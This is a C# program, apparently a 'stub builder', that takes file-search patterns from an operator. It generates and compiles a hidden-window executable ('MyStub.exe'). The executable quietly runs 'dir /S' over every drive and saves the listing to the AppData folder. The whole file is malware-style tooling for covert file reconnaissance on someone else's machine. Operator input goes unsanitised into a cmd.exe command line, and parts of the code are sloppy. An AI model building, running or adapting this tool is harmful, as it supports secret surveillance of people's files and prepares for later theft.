﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;

using System.Text;
using System.Threading.Tasks;

class Program
{

    public static string search;
    public static string stubname;
    static void Main(string[] args)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(@"
$$$$$$ /$$ /$$ /$$ /$$ /$$
| $$/|/| $$ | $$$ /$$$ |/
| $$ /$$| $$ /$$$$$$ | $$$$ /$$$$ /$$$$$$ /$$$$$$ /$$ /$$$$$$$ /$$$$$$
| $$$$$ | $$| $$ /$$__ $$| $$ $$/$$ $$ |___ $$ /$$__ $$| $$| $$__ $$ /$$__ $$
| $$/ | $$| $$| $$$$$$$$| $$ $$$| $$ /$$$$$$$| $$ __/| $$| $$ \ $$| $$$$$$$$
| $$ | $$| $$| $$/| $$\ $ | $$ /$$ $$| $$ | $$| $$ | $$| $$/
| $$ | $$| $$| $$$$$$$| $$ / | $$| $$$$$$$| $$ | $$| $$ | $$| $$$$$$$
|/ |/|/ _/|/ |/ ___/|/ |/|/ |/ _____/

Coded By Aleksey.");
        
        Console.WriteLine("Log output name: ");


        stubname = "\"" + Console.ReadLine() + "\"";
        Console.WriteLine("Enter find arguments: ");
        search = "\"" + Console.ReadLine() + "\"";
        




        string sourceFile = "Class1.cs";
        string exeFile = "MyStub.exe";
        File.WriteAllText(sourceFile, @"using System;
using System.IO;
using System.Net;

using System.Text;

namespace ConsoleApp20
{
    class Class1
    {
        static void Main(string[] args)
        {

            

            string search = "+search+ @";
            string[] blud = search.Split(' ');
            string stubname = " + stubname+ @";



            var logFile = new StringBuilder();

            var drives = new[] { 'C', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
            string swihd = """";
            foreach (var drive in drives)
            {
                foreach (string b in blud)
                {
                    swihd = swihd + @""dir /S "" + drive + "":\\"" + b + "" "";
                }
                var output = new StringBuilder();
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = ""cmd.exe"",
                        Arguments = @""/C dir /S "" + drive + "":\\"" + swihd,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    }
                };
                process.Start();
                while (!process.StandardOutput.EndOfStream)
                {
                    output.AppendLine(process.StandardOutput.ReadLine());
                }
                process.WaitForExit();
                logFile.Append(output);
            }
            string filepath = Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + stubname + "".txt"");
            
            File.WriteAllText(filepath, logFile.ToString());




        }
    }
}

    


");
        // Save the text to a file
        
        Task.Delay(1000);
        // Build the source file
        var buildProcess = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "csc.exe",
                Arguments = $"/target:winexe /reference:System.dll /reference:System.IO.dll /reference:System.Net.dll /out:{exeFile} {sourceFile}",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            }
        };
        buildProcess.Start();
        buildProcess.WaitForExit();

        // Print the output of the build process
        Console.WriteLine(buildProcess.StandardOutput.ReadToEnd());

        // Check if the build was successful
        if (buildProcess.ExitCode == 0)
        {
            Console.WriteLine($"{exeFile} was successfully built.");
        }
        else
        {
            Console.WriteLine($"Failed to build {exeFile}.");
        }
        Console.ReadLine();
    }
}
    